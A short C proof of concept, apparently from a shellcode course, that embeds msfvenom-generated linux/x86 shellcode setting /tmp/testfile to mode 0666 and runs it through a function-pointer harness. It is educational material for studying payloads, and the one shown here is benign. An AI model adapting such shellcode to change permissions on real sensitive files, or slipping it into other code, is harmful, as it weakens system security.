/*
 * Title: msfvenom - chmod 666  PoC
 * Platform: linux/x86
 * Date: 2015-01-13
 * Author: Dennis 'dhn' Herrmann
 * Website: https://zer0-day.pw
 * Github: https://github.com/dhn/SLAE/
 * SLAE-721
 */
#include <stdio.h>

unsigned char shellcode[] =
	"\x99\x6a\x0f\x58\x52\xe8\x0e\x00\x00\x00\x2f\x74\x6d\x70\x2f"
	"\x74\x65\x73\x74\x66\x69\x6c\x65\x00\x5b\x68\xb6\x01\x00\x00"
	"\x59\xcd\x80\x6a\x01\x58\xcd\x80";

void
main(void)
{
	int (*ret)() = (int(*)())shellcode;
	ret();
}
